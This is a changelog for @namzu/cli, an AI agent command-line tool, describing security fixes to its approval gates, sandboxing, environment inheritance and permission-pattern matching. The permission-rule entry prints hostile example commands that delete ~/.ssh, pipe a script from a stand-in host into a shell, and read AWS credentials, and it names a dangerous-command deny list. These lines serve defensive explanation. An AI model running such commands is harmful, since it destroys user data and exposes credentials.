  A server declared whether its own tools were read-only, and that declaration settled whether a call was approved without asking. The thing being gated supplied the input to the gate — on **three** independent paths: the kernel's `allow_read_only` rule, the CLI's prompt exemption, and the plan-mode pass in the executor.

  The wire calls those fields _hints_. All three read them as facts.

  **The asymmetry is the fix.** A self-declaration may raise the requirement and never lower it:

  - `destructiveHint: true` from a server is still believed. A server volunteering that its tool is dangerous moves toward caution, and disbelieving it buys nothing.
  - `readOnlyHint: true` no longer settles a call or skips a prompt on its own.

  **Trust comes from the operator, per server.** A tool supplied by a connected server now carries `provenance: { server, readOnlyHintTrusted }`, and `isTrustedReadOnly` is the single predicate all three gates use. Never a global switch: one flag meaning "trust annotations" hands every connected server the same reach, which is the hole it would be closing.

  `isReadOnly` still reports faithfully what the server said. Provenance and policy are different questions, and collapsing them would corrupt the outbound re-export and the destructive label a human is shown in order to fix a gate.

  **What changes for you.** Calls to a connected server's read-only tools that were auto-approved now go to review or a prompt. Host-defined tools are unaffected and need no opt-in — they came from this process, with no untrusted party in the chain. To restore the old behaviour for a server you run yourself, mark that server's read-only hints trusted.

  **More prompts is not automatically safer.** Measured work on approval UX finds miss rates rising with session length, so the per-server opt-in matters as much as the tightening does: an operator flooded with prompts approves by reflex, and that is the failure this change is trying to avoid, not cause.

- a8e2acf: The CLI runs commands in a sandbox, and you can configure it

  `sandboxProvider` appeared **zero times** in this package. `query()` attaches a sandbox only when one is supplied, so `context.sandbox` was always undefined and `BashTool` took its fallback branch — `execAsync` in the host process, with `{ ...process.env }`. Every credential your shell holds went to every command the model chose to run, on every path, interactive included. The isolation the documentation described held nowhere.

  **A sandbox is now attached by default.** Nothing to configure to get it.

  **And it is yours to control**, under a new `sandbox` block:

  ```yaml
  sandbox:
    enabled: true # default; false runs on the host
    requireIsolation: [filesystem, network] # refuse to start unless enforced
  ```

  `requireIsolation` is empty by default, and that default is honest rather than safe: available isolation differs per platform, so requiring anything by default would refuse to run on machines where the CLI works today. Name a control and you get a refusal at startup instead of a surprise at runtime.

  **Every session reports what it got**, including when the answer is "nothing". A sandbox that confines nothing is not the same as no sandbox and is not protection, so the notice says which controls are enforced and which are not, and says outright when commands are unconfined.

  **Why `major`.** Commands now run inside a sandbox, so anything reaching a path outside the workspace, or the network where the platform confines it, behaves differently. Set `sandbox.enabled: false` to keep the old behaviour — a real choice with a real reason, announced on startup rather than assumed.

### Patch Changes

- Updated dependencies [ee70817]
- Updated dependencies [2730fac]
- Updated dependencies [cce731b]
  - @namzu/sdk@27.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 10.0.0

### Major Changes

- 203928c: A config file that cannot be read stops the run instead of being read as an empty one

  **What breaks.** `loadConfig` returned `{}` for a config file it failed to open
  or parse, which is the same answer it gives for a file that is not there. It now
  throws `ConfigLoadError`, and the binary exits `78` (sysexits `EX_CONFIG`) with a
  message naming the file. Three inputs that used to start a run now refuse:
  a file that exists and cannot be opened, a file whose contents do not parse, and
  a file whose top level is not a mapping of settings.

  **Why this is not a nicety.** `permissions` is read from these files. An empty
  config is an empty rule table, and a headless run resolves every call no rule
  covered to `auto` — so a `deny` an operator had written became approval of
  exactly those calls, with nothing printed to say the table had been dropped. The
  fail-open landed on the one path where nobody is watching, and a missing brace
  was enough to reach it.

  **What a caller does about it.** If the run should have no rules, delete the file
  or empty it — absent and empty both still mean "no settings", and neither throws.
  If the file is meant to be read, the message names the file and the reason; fix
  it. A host embedding the CLI that wants the old behaviour has to catch
  `ConfigLoadError` itself and decide, in the open, that starting unrestricted is
  what it wants.

  Also new: `EXIT_BAD_CONFIG` (78) is exported alongside the other exit codes, and
  `ConfigLoadError` is exported from the package root.

### Patch Changes

- Updated dependencies [3f44f0d]
- Updated dependencies [fcc9a41]
- Updated dependencies [2737f74]
- Updated dependencies [bac980a]
  - @namzu/sdk@26.1.0

## 9.0.0

### Major Changes

- b902ecb: A stdio server is handed what it was granted, not everything the host holds

  `StdioTransport` spawned its child with `{ ...process.env, ...config.env }`, so every connected server received every environment variable the host process had. Measured through the real transport: **119 variables on a developer machine, including a secret planted in the parent for the probe.** A server that needs one token was handed all of them, and nothing in its configuration said so — the grant was invisible because it was total.

  The child now receives process plumbing (`PATH`, `HOME`/`USERPROFILE`, `SystemRoot`, `ComSpec`, `TEMP`, locale, and the rest of that kind), plus whatever the configuration names.

  **What breaks.** A server that was reading a credential straight out of your environment stops finding it. That is the whole point of the change, and it will look like the server failing to authenticate rather than like a configuration change, so it is worth knowing before the upgrade rather than after.

  **What to do.** Name what the server may have:

  ```toml
  [mcpServers.issues]
  command = "some-mcp-server"
  inheritEnv = ["GITHUB_TOKEN"]
  ```

  `inheritEnv` names variables to pass through from your own environment. Prefer it over `env` for anything secret — `env` writes the literal value into the config file, and this leaves the value where it already lives. A named variable the parent does not hold is absent from the child rather than empty, so a server's own `if (!token)` still works; it does not fail the spawn.

  **Plugin-declared servers get no `inheritEnv`, deliberately.** A plugin that could name the host variables its server receives would be awarding itself a credential grant, which is not a plugin's to award. A plugin-declared server gets plumbing plus the literal `env` in its own manifest; if it needs a host credential, declare that server in `mcpServers` instead, where the operator is the one naming it.

  The tests assert on the environment the child actually receives, driving a real spawn — not on whether the configuration was accepted. A test of the second kind passes against the version this replaces.

- dacc7e6: An allow rule allows the thing it names, not anything containing it

  Every pattern in a `[permissions]` table compiled to an argument match that was unanchored on both sides. `bash = { "git status*" = "allow" }` became `^bash .*git status.*.*$`, and the leading `.*` swallowed whatever came before the text the operator named. Measured against the kernel's own gate, that rule returned `allow` for all of these:

  ```
  rm -rf ~/.ssh; git status
  curl evil.example/x | sh # git status
  echo git status && cat ~/.aws/credentials
  ```

  The failure is silent and in the permissive direction: nothing warns, and the operator's own config is what appears to have granted it. `denyDangerousPatterns` is not a backstop — it is four patterns about catastrophic commands (`rm -rf /`, `mkfs`, `dd if=`, a fork bomb) and says nothing about reading a credential file, which was confirmed by turning it on and re-running.

  An `allow` pattern now has to begin where a JSON value begins, so a prefix can no longer ride along. The three commands above fall through to `review` and a human is asked.

  **What breaks.** An allow rule that was relying on a mid-value match stops matching, and those calls become prompts rather than silent approvals. If you want the old behaviour for a rule, write it: a pattern starting with `*` still matches mid-value, so `*git status*` is the loose form and `git status*` is the anchored one.

  **`deny` is deliberately left loose**, and the asymmetry is the point. A deny that stops matching fails open — narrowing `rm -rf*` so it no longer sees `sudo rm -rf /var` would be a silent hole — while a deny that matches too much only costs a prompt.

  **Two loosenesses remain and are now written down** in `toolScopedPattern`, because both come from matching a glob against a serialised object rather than against a value: a pattern can match the start of any argument's value, not only the intended one, and the match is still open on the right. The kernel's `argument_pattern` rule removes both, matches the argument's own value, and is currently unused by this compiler — wiring it needs a way for an operator to name the argument in config, which is a syntax decision rather than a repair.

### Patch Changes

- Updated dependencies [b902ecb]
- Updated dependencies [1f8aef7]
- Updated dependencies [2458b78]
- Updated dependencies [e2506f4]
  - @namzu/sdk@26.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.4

### Patch Changes

- Updated dependencies [917e4a5]
- Updated dependencies [e6818ee]
  - @namzu/sdk@25.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.3

### Patch Changes

- Updated dependencies [50dee5c]
  - @namzu/sdk@24.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.2

### Patch Changes

- Updated dependencies [f58a086]
  - @namzu/sdk@23.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.1

### Patch Changes

- a60a0ad: `/cost` and the status bar stop reporting an unpriced run as a free one

  The kernel now prices runs from a built-in catalogue and reports
  `costInfo.unpricedTokens` when it cannot. The CLI was still narrowing that
  record to a single number and printing
  `'$0.0000 (this provider reported no price)'` for any total not above zero —
  so the operator-facing surface kept making the claim the kernel had just
  stopped making.

  Two things were wrong with that line beyond the number. A run on local
  inference costs nothing and is not the same event as a run nobody can price,
  and both landed on the same sentence. And the sentence asserted something
  about the provider that no code had checked: what is known is that namzu has
  no rate for the model, which is a statement about this side of the wire and
  points at a different fix.

  `/cost` now distinguishes three states — a real cost, a measured zero, and not
  known — and marks a partly-priced run as a floor rather than an answer. The
  status bar shows `$?` rather than omitting the figure, because a missing cost
  on a line read at a glance is read as no cost.

  `patch`: no exported symbol changes. The internal `AgentEvent` usage variant
  carries the kernel's `CostInfo` whole instead of a flattened `costUsd`, but
  neither it nor the renderers are part of `@namzu/cli`'s public barrel — the
  package exports a CLI, and its behaviour is corrected, not extended.

## 8.6.0

### Minor Changes

- 1797bf1: A reply arrives in whole blocks instead of typing itself out.

  Token deltas used to be appended to the transcript the moment they arrived.
  Nothing animated them — there is no timer anywhere in the package — but a few
  characters at a time reads the same way, and an operator ends up watching a
  line grow rather than reading it.

  Deltas are now held and released a **block** at a time: a paragraph, a list, a
  fenced code block. A short answer has no blank line in it, so it is one block
  and appears whole, which is the common case. A long answer appears paragraph by
  paragraph, so the screen still shows that work is happening without spelling it
  out letter by letter.

  **A fenced code block is never split**, even though it contains blank lines.
  Cutting there would hand the renderer a fence that opens and never closes, and
  the first half of a snippet would render in a different style from the second.

  Nothing is lost. The tail of a reply is an incomplete block by construction, so
  every close path — normal completion, a tool call interrupting the text, an
  error mid-turn — flushes what is buffered before finalising. That is the one
  way this could have gone wrong quietly, and it is the failure the new tests are
  built around: they drive a rendered turn and assert the whole reply is on
  screen, exactly once, including a reply that never completes a block at all.

## 8.5.1

### Patch Changes

- Updated dependencies [a4bcbc9]
  - @namzu/anthropic@3.3.0
  - @namzu/sdk@22.0.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.5.0

### Minor Changes

- 3f87189: Makes the subscription sign-in reachable from the screen that needs it, and
  adds `namzu login` / `namzu logout`.

  **The bug this fixes.** The sign-in shipped as `/login`. Slash commands are
  typed into the composer, and the composer does not exist during the provider
  picker — so the one operator who most needs to sign in, the one with no
  credential at all whom namzu routes straight to the picker, was the one
  operator who could not reach it. There was no other route: nothing else writes
  the credential store. The screen listed the sources it scans, offered to take a
  pasted key, and told them to set an environment variable and restart, while a
  working sign-in sat behind a keystroke that did not exist.

  - **`l` at the picker** starts the sign-in. namzu opens your browser and picks
    the result up when the page finishes.
  - **`namzu login`** does the same from a bare shell, and also reads a pasted
    address from standard input — so a container or a remote machine with no
    browser can finish the sign-in. `--no-browser` skips the launcher,
    `--timeout <seconds>` bounds the wait. **`namzu logout`** removes the
    credential.
  - **The picker's source list now names `~/.namzu/credentials.json`**, which it
    scanned and did not mention.

  There is deliberately no `namzu login --code <value>`: the PKCE verifier lives
  in the process that started the sign-in, so a second invocation could not
  finish the first one's attempt. A flag that looks like it should work and
  cannot is worse than its absence, so the paste is read by the waiting process
  instead.

  Two message defects found by running it rather than reading it: a bare Enter at
  the prompt spent the whole attempt on an empty paste, and a failed sign-in in a
  terminal told you to "run /login" — a slash command, in a shell.

## 8.4.0

### Minor Changes

- f84d2e3: `Ctrl+O` expands collapsed tool output in place again, for the rows still on
  screen.

  The last few transcript entries are now drawn live rather than printed once, so
  pressing `Ctrl+O` replaces the `… +6 lines` hint with the lines it was hiding —
  in the row where it already is, with nothing printed twice. Pressing it again
  closes them.

  How far back it reaches is bounded by your terminal's height, because the live
  region has to stay well inside the viewport. On a terminal roughly under thirty
  rows there is no room for one, and `Ctrl+O` says so and points at `/expand`
  rather than doing nothing. `/expand <n>` is unchanged and remains the way to
  reach anything older; it still appends the full body as a new entry.

  Nothing changes for a caller: no exported type, flag or route moved.

### Patch Changes

- 908cbf6: Parse a streaming reply one block at a time instead of re-parsing the whole
  message on every token.

  The pending transcript row re-renders per token, and each render re-parsed the
  entire message: a forty-block answer was parsed forty blocks deep on every
  token, so the cost of streaming a reply grew with the square of its length. Long
  replies now stream at a cost that tracks their length rather than its square.

  Nothing changes for a caller. `@namzu/cli` exports no markdown API; the new
  `scanBlocks` and `parseBlock` are internal to the terminal UI, and
  `parseMarkdown` is now the composition of the two with identical output.

## 8.3.0

### Minor Changes

- 2037c65: Sign in with a subscription instead of pasting an API key.

  `/login` runs an authorization-code sign-in with PKCE and stores the result in
  `~/.namzu/credentials.json`, on every platform. namzu refreshes it as it
  expires and finds it again on the next launch; `/logout` removes it. If you
  already use an environment variable or a typed key, nothing changes — this adds
  a door, it does not move one.

  **On a machine with no browser** the sign-in still works. namzu prints the
  address; open it wherever you have a browser and hand the result back with
  `/login <address-or-code>`. namzu tells you at the time whether the automatic
  hand-back is available on your machine, rather than leaving you waiting for one
  that is not.

  **The credential file is private, and namzu proves it rather than assuming it.**
  It is written owner-only and the protection is then read back — the mode on
  Linux and macOS, the access-control list on Windows, where a POSIX mode proves
  nothing. If that check cannot be made the file is deleted and the sign-in fails
  with a reason.

  **Whose OAuth client namzu presents is recorded in the source, next to the
  value** (`packages/cli/src/integrations/providers/identity.ts`). It is not
  namzu's own: the authorization server accepts no other client for plan-backed
  inference and the vendor operates no open registration, so the choice was
  between using it and not offering the capability. You sign in on the vendor's
  page against your own account; nothing is proxied through a namzu service.

  Nothing is added to a package's runtime dependencies, and no existing export
  changes shape. Two additions a consumer of `@namzu/cli`'s types may notice:
  `DetectionSource` gains a `'stored'` member, so an exhaustive `switch` over it
  needs an arm; and a discovered provider's `oauth` metadata gains an optional
  `origin`, which defaults to the previous behaviour when omitted.

## 8.2.0

### Minor Changes

- 2d3f1fb: A missing credential no longer strands you: enter one from inside namzu

  Launching with a provider saved in `~/.namzu/preferences.json` and no credential
  for it produced a screen you could do nothing on — a disabled composer, a hint
  that read `Ctrl+C ×2 to exit`, and a message advising you to pick another
  provider on the one screen that will not let you pick one.

  That launch now lands in the **picker**, with the reason printed on the picker
  itself, and you can:

  - press `k` to enter a credential for the saved provider and carry straight on
    into a session, without leaving the program or setting an environment
    variable — including when other providers are detected, which previously hid
    the entry key entirely;
  - or choose a different provider, or leave with `Esc` / `Ctrl+C`, both named on
    screen.

  Entering a credential for the saved provider keeps the rest of your saved chain,
  including a pinned model, rather than resetting you to the registry default.

  **The entry screen now accepts a subscription token as well as an API key.** It
  reads which kind you pasted, sends it on the wire accordingly, and says which it
  took. A pasted subscription token has no refresh data with it, so it lapses
  within hours and cannot be renewed — you are told that at the paste rather than
  discovering it as an authentication failure mid-turn. A credential is still held
  in memory for the session only and is never written to disk.

  Two smaller corrections ride along: a base64 credential ending in `=` padding is
  no longer rejected as a shell fragment, and a refusal that routes you to the
  picker is now drawn _on_ the picker (the transcript is not rendered during that
  phase, so those explanations were previously invisible until after you had
  already chosen).

  Headless runs (`namzu -p`, `run-stream`, `drain`) are unchanged: a missing
  credential still refuses, with the same exit code, and never silently moves your
  run onto a different provider. The refusal's advice now names `--provider`,
  which is the thing a scripted caller can actually do.

## 8.1.0

### Minor Changes

- f59a8b0: `--gate '<command>'` — a run that is not allowed to finish on a red build

  `reviewAnswer` shipped complete: consulted only when the model stops calling tools, never on the forced-final turn, bounded by a rejection budget, with its own terminal state `answer_rejected` so a stop is not mistaken for a token budget running out. **No shipped app supplied one**, so an operator could not use any of it without writing TypeScript.

  New in `@namzu/sdk`: `createCommandGate({ commands, cwd, maxRetries?, timeoutMs?, exec?, maxOutputChars?, fingerprint? }): ReviewAnswer`. It runs shell command lines in order, stops at the first failure, and hands the failure back as the next user turn naming the command, the attempt, the exit code and a head-and-tail clip of the output.

  New in `@namzu/cli`: a repeatable `--gate '<command>'` on `run` and `run-stream`, plus `--gate-retries <n>`. Repeating the flag appends rather than replaces — `--gate 'pnpm typecheck' --gate 'pnpm test'` means both, in that order.

  **The part that makes it a bounded loop rather than one that burns its budget.** Before re-running a command that already failed, the workspace is fingerprinted; if it is byte-for-byte identical to the snapshot taken when that command last failed, the command is **not run**. The attempt still advances and the model is told the workspace has not changed and must edit something before trying to finish — cheaper than a full test run, and a _different_ instruction from repeating a failure it has already been shown.

  Also new and exported: `fingerprintWorkspace({ cwd, exec, timeoutMs?, maxBytes?, fs? })`. It hashes `git status --porcelain`, `git diff --binary HEAD` and the contents of every untracked file, **recording a symlink as its target rather than reading through it** — a link repointed to a different file with identical bytes is a change, and following it would hash the two the same.

  It returns `null` — meaning _no fingerprint_ — for a non-zero git exit, a tree with no commits, a timeout, or output past the size cap, and a caller that cannot fingerprint re-runs its command. That direction is deliberate: a wrong `null` costs one execution, while a wrong match is a verification that silently did not happen.

  A run with no `--gate` is byte-identical to one from before this existed: the option is spread in only when gates were asked for.

- 1be00a7: A run now remembers what it worked out, instead of dropping it at settle

  `promoteMemory` is invoked once when a run settles, with the compaction extractor's already-structured output — decisions, discoveries, user requirements, failures, environment facts, with eviction counts carried rather than hidden. **No shipped app supplied the hook.** So that structure, which the compaction pass spent tokens producing, was serialized into one system message and dropped on the floor when the run ended; the only way into namzu's memory store was the model deciding to call `save_memory`.

  New in `@namzu/sdk`: `createMemoryPromoter({ store, tags?, maxPerCategory? }): PromoteMemory`, plus `RUN_MEMORY_TAG`. `@namzu/cli` supplies it over the very store its memory tools already use, so what a run learns is what `search_memory` finds on the next one.

  ## What changes for you without asking

  **This is on by default, and it applies to the interactive TUI as well as to `namzu run` and `namzu run-stream`.** The promoter is supplied from the session every surface is built on, so an ordinary chat session that works something out now leaves a markdown record under `<cwd>/.namzu/memory` when the run settles — a directory that previously only ever grew when the model chose to call `save_memory`. The next session's `search_memory` will find those records, which is the point, and it is also the part you will notice.

  It is not opt-in because the alternative it replaces is not neutral: a run's extracted knowledge was being discarded at settle, and a flag would mean the default stays the lossy one. What keeps it from being noisy is the filter below — a session that answered a question without deciding, discovering, failing at or being told anything durable writes nothing at all.

  An SDK embedder can replace or disable it by passing its own `promoteMemory` to `query` — a function that does nothing writes nothing. **The CLI has no flag for it in this release**, which is worth knowing before you upgrade if a written-to `.namzu/memory` is a problem for your setup; say so and it becomes one.

  **The filter is the whole decision, and it is strict.** A run that learned nothing leaves **no record at all** — not an empty one, not one whose body says "no decisions". Only the five knowledge categories count: user requirements, decisions, discoveries, failures, environment. Not `task`, which every run has because it is the prompt restated; not `files`, which every run that opened anything has and which says what was _touched_ rather than what was _learned_. The model reads this store on later runs, so a record per run is not merely wasted disk — it is context spent on runs that discovered nothing.

  Records are markdown, tagged `run-memory`, and carry the forming run's id in their metadata so a surprising memory can be checked against what actually happened. Eviction counts are rendered, because somebody reading the record should know they are reading a truncated account of the run.

  The promoter deliberately does **not** catch its own failures: the runtime already catches and logs a promoter throw at settle without touching the answer, and catching here as well would hide a broken store from the one place that reports it.

  It also does not deduplicate, merge with a previous run's record, or expire anything. Each is a policy with real trade-offs, and `promoteMemory` is a callback precisely so the runtime does not decide them — this is the obvious default, not the only possible one. Pass your own `PromoteMemory` to `query` to replace it.

  Sub-agents do not promote. A parent that delegated six times would otherwise leave seven accounts of one piece of work for the next run to read; the parent's settle speaks for the whole task.

### Patch Changes

- Updated dependencies [f59a8b0]
- Updated dependencies [1be00a7]
  - @namzu/sdk@21.1.0

## 8.0.0

### Major Changes

- 8975cce: `namzu doctor` no longer exits 0 when a check could not answer

  **What breaks.** `namzu doctor` gains a new exit code, `69`, and a new status
  word, `skipped`.

  - **A CI step running `namzu doctor` can now fail where it used to pass.** If a
    check times out, is aborted, or the thing it reads throws, the command exits
    `69` instead of `0`. Nothing is claimed to have failed — `1` still means that
    — but the report is incomplete, and it used to say so only in text nothing
    reads. If you need the old behaviour while you look into it, treat `69` as
    success explicitly rather than by accident.
  - **`DoctorStatus` gains `'skipped'`.** An exhaustive `switch` over it, or a
    `Record<DoctorStatus, …>`, stops compiling. Handle `skipped` as "there was
    nothing here to check" — an ordinary state of a healthy machine, not a
    problem.
  - **`DoctorReport['exit']` gains `69`**, and `DoctorReport['summary']` gains a
    required `skipped: number`. Code that constructs a `DoctorReport` by hand must
    add the field; code that reads the summary can now rely on the counts summing
    to `total`, which they did not while `skipped` was hidden inside
    `inconclusive`.

  **Why.** "Healthy" and "did not manage to look" shared an exit code in the one
  command whose entire job is to report state it read. Fixing that needed the
  status vocabulary split first, because `inconclusive` was carrying two facts:
  _there is nothing here to check_ — an optional package absent, a registry with
  no auto-discovery, nothing configured yet — and _this check did not answer_.
  Only the second is a gap worth an exit code; making both non-zero would have
  turned `namzu doctor` red on every healthy machine.

  So `vault.registered`, `providers.registered`, `providers.chain` with no
  preferences file, and `telemetry.installed` with the package absent now report
  `skipped`, and they still exit `0`.

  **Also fixed:** `telemetry.installed` reported `not installed (optional
package)` for _any_ import failure, so a package that was present and threw on
  load was reported as absent. Resolution and loading are now asked separately —
  cannot resolve is `skipped`, resolves but throws is `fail`, with the reason.

  **Why 69 and not 2.** `2` already means "no checks registered" here. `namzu
eval` spells the same idea `2`, which it can because it never spent that number
  on anything else; giving one number two meanings inside one command is worse
  than giving one meaning two numbers across two. `69` is sysexits
  `EX_UNAVAILABLE`.

- c3c8358: `run-stream`'s exit code now says whether you can do anything about the failure

  **What breaks.** Four conditions that exited `0` now exit `1`, and two flags
  that were accepted and ignored are now refused.

  | Condition                                                                                                                            | Was                                  | Is                                 |
  | ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------ | ---------------------------------- |
  | `--session <id>` and the conversation cannot be opened                                                                               | `0`                                  | `1`                                |
  | No LLM provider available                                                                                                            | `0`                                  | `1`                                |
  | The session has no provider for an environment reason (no credential, a driver that would not load, a chain that contradicts itself) | `0`                                  | `1`                                |
  | A declared tool server is not available                                                                                              | `0`                                  | `1`                                |
  | A command file that will not parse                                                                                                   | `0`                                  | `1`                                |
  | `--continue` / `--resume`                                                                                                            | silently ignored, ran stateless, `0` | refused with an `error` event, `0` |

  Everything else is unchanged. An unknown option, a missing prompt, a `--cwd`
  that does not exist, a bad `--permission-mode`, an interactive command named
  headlessly and a provider id that is not a provider all still exit `0`; so does
  a run that started and failed; and an untrusted folder still exits `77`.

  **If you have a host that treats non-zero as "the folder is untrusted"**, that
  is the assumption to change: `77` still means only that, but `1` now means "a
  person has to fix something before this can work". If your host retried on `0`,
  it will stop looping on faults retrying could never fix — which is the point.

  **Why.** The documented rule was _started and failed → 0; refused to start →
  non-zero_, and applied to the real cases it did not sort them: an unknown
  option, a missing prompt, a bad `--cwd` and an unavailable tool server are all
  refusals to start, and all four exited `0` while an untrusted folder exited
  `77`. The retry argument the source appealed to does not sort them either —
  retrying an unknown option is as pointless as retrying an untrusted folder.

  The axis that does: **can the caller reach the run it asked for by changing what
  it sends?** Yes → `0`, and the host fixes its own invocation. No → non-zero,
  because a person has to act. Dropping `--session` is not "the caller fixing it";
  it abandons what was asked for.

  `1` rather than a new code because `namzu run` — the same one-shot, differing
  only in how it prints — already exits `1` for these conditions and `77` for
  trust. `77` stays scoped to trust, because being unambiguous is its whole
  justification.

  **Two branches had to be split before they could be sorted.** `hasProvider ===
false` covered both a provider id that is not a provider (yours to fix) and four
  environment failures; a refused command expansion covered both a bad invocation
  and a command file that will not parse. Each now carries the distinction as a
  field — `AgentSession.errorKind` and the `fixable` flag on a `refused`
  expansion — rather than leaving a caller to match on the message text, after
  which the message could never be reworded.

### Minor Changes

- 4df5cf1: `drainRuns` — the queue loop the cross-process claim shipped without

  `claimRun`, `releaseRun`, the fenced `writeCheckpoint`, `listDurableRuns({ claimed: false })` and `resumeRun({ claimFence })` were all already here, and nothing outside the store's own tests called any of them. The two things the claim was built for — an approval inbox and a crash sweeper — still needed every host to write the same loop, including the two parts a host writes wrong: the release that belongs in a `finally` so a FAILED run goes back on the queue too, and the `null` claim that means "somebody got there first" rather than an error.

  New: `drainRuns({ store, scope, holder, ttlMs, onRun, park?, signal?, maxConcurrent?, pageSize?, now? })`, plus the types `DrainRun`, `DrainRunsParams`, `DrainRunsResult`, `DrainFailure` and the constant `DEFAULT_DRAIN_PAGE_SIZE`. One bounded pass: list what nobody holds, claim it, hand it to your callback with its claim, release it. No timers, no processes, no `while (true)` — running it again is your scheduler's job.

  **Read this before relying on "exactly once".** Two drainers never hold one run at the same time; that is absolute. Exactly-once over a pass is weaker and comes from the FILTER, not the claim: a listing is a snapshot, so between paging a row and claiming it another drainer can finish that run and release it. A claimed row is therefore re-read against `park` before any work starts, and one that no longer matches comes back as `stale`. An inbox drain (`park: ['outstanding']`) whose work answers the park is exactly-once. **With no park filter there is nothing to re-check and two drainers can both process one run** — a checkpoint store holds no run status by design, so "already done" is a fact only your own run records carry, and a crash sweep intersects with them inside `onRun`.

  A store missing `listDurableRuns`, `claimRun` or `releaseRun` is refused with `capability_unavailable` **before anything is listed**, naming all three. It never degrades to "claimed by default", which would let every worker proceed on every run.

  `@namzu/cli` gains `namzu drain --store <dir> --tenant <id> --project <id> --session <id>`, which claims each unheld run under that scope and continues it from its last checkpoint under that claim's fence. It is one pass and then exit: `namzu serve` still answers that namzu has no daemon, and this command is the shape that refusal implies — something your scheduler runs, not a service namzu owns. A run parked on a human decision is reported, never resumed past. Additive on both packages; nothing existing changes behaviour.

### Patch Changes

- fce37b2: `/resume` now stops the turn it interrupts, and that turn is saved where it belongs

  Selecting a conversation from the `/resume` picker while the agent was working
  left the old turn running. Three things followed, and the last one outlived the
  process:

  - its tool rows and reply text kept appending into the resumed transcript, so
    one conversation's output arrived in the middle of another;
  - a follow-up you had queued for the old conversation was sent to the new one
    the moment the screen went idle;
  - when it finished, it wrote its messages into the **resumed** conversation's
    stored history. `namzu` then showed you a turn you never had there, and fed it
    to the model as context on the next one.

  Selecting a conversation now interrupts the running turn first, the same way
  `Esc` does. The interrupted turn is not discarded: it finishes reading its own
  events, its reply so far is written to the conversation it was started in, and
  the transcript says so — a tool call already dispatched is not undone, and the
  line says that too. Cancelling the picker still changes nothing, and a
  conversation that cannot be read now leaves the running turn alone rather than
  stopping it on the way to a failure.

  No API changed. If you script against `namzu`'s stored history, note that
  records written by this defect are already on disk and this release does not
  rewrite them.

- Updated dependencies [8975cce]
- Updated dependencies [4df5cf1]
- Updated dependencies [1582bdb]
- Updated dependencies [5dc8b82]
  - @namzu/sdk@21.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 7.0.0

### Major Changes

- 97e356a: **`run-stream --session <key>` no longer answers against a history you did not
  ask for, and no longer ends on a bare `done` when it failed to save the turn.**

  Two bare `catch` blocks at opposite ends of the same command, both of which
  produced an ordinary success.

  ## What breaks

  **A conversation that cannot be opened now stops the run.** Given `--session`,
  if the store cannot be reached — an unwritable `.namzu`, a corrupt map file —
  `run-stream` emits an `error` event and runs nothing. It used to fall through to
  the stateless path, which takes prior turns from **stdin**, so a caller who named
  a conversation got a turn composed against a different history, or none, and
  `exit 0`.

  _If you relied on that fallback:_ drop `--session`. That asks for the stateless
  run explicitly, which is the only way the command can tell the two apart.

  It is a refusal rather than a warning-and-continue because the command cannot say
  what was lost. A key is created on first use, so a fresh key legitimately has no
  prior turns — and the failure is precisely what stopped it finding out which case
  it was in. "Could not look" is not "there was nothing there."

  ## Also

  **A turn that could not be saved now says so**, as a `notice` on the event
  stream, naming the reason and the consequence: `history` for that session will
  not include the turn and the next turn will not have it as context. The run still
  succeeds and still exits 0 — the reply is complete and a host treating this as a
  failed turn would be wrong. It was previously swallowed, which made a later
  `namzu history` look broken with nothing connecting it to a write minutes
  earlier.

  `notice` is an existing event kind on this stream, already used for the config
  notices a few lines above the same handler.

### Patch Changes

- 1e347cd: **The permission prompt names `Ctrl+C`, and says why it is different from `n`.**

  `n` and `Esc` decline the tool call and the turn **continues** — the agent is
  told, and tries something else. `Ctrl+C` declines and **stops the turn**. Two
  different decisions, and the prompt listed only the first.

  So the only key that stops namzu was the one an operator could not see from the
  screen that governs it. Someone who wanted it to stop pressed `n`, watched it
  carry on with a different approach, and had nothing on that screen to tell them
  otherwise; the distinction existed only in the documentation.

  The prompt now lists all four keys, grouped by outcome, on two lines — at four
  keys a single line wraps mid-key on a narrow terminal, and this is the box you
  read while deciding. The status-bar hint keeps its compact three-key echo, which
  is budget-constrained by construction and shares a line with the working
  directory, the provider and the model.

  No behaviour changed. `Ctrl+C` has always done this.

## 6.0.2

### Patch Changes

- 4a6c86b: **`/tools` lists the tools the agent can call now, not the ones it could call
  when the session opened.**

  Some tools register during the first turn rather than at connect — the agent's
  own task tools are the ones that do it today. `/tools` was answering from a list
  captured before that happened, so those tools were missing from it for the whole
  session.

  The visible symptom was two commands disagreeing on one screen: `/permissions`
  reads the roster live and would name a tool as never-prompted that `/tools` did
  not list at all, which reads as namzu having invented a tool name.

  The connect line (`Connected to … · N tools`) is unchanged and still reports the
  count at connect time, because it describes a connection that has just happened.

## 6.0.1

### Patch Changes

- 7b60250: **`namzu doctor` now marks an unpinned model `(namzu default)` instead of
  `(default)`, and the picker's notices stop calling it the provider's.**

  A chain member that omits `model` gets a value out of namzu's own registry — a
  table compiled into the release. It is resolved at launch but never refreshed
  from the provider, so between releases it can name a model the provider has
  superseded.

  Every surface that showed that value called it "the default" or "its default",
  which reads as the provider's current one. It sends an operator who did not
  expect the model to go looking at the provider, where there is nothing to find.
  The thing to do is give that member an explicit `model`, and the surfaces now
  say so:

  - `namzu doctor`'s chain readout prints `<model> (namzu default)`.
  - The `/model` picker's four "could not list" notices say "showing namzu's pick
    for it" rather than "showing its default" — they sat beside a row already
    labelled `(namzu default)` and contradicted it.
  - `docs/cli/providers.md` no longer says an omitted `model` "tracks the default".
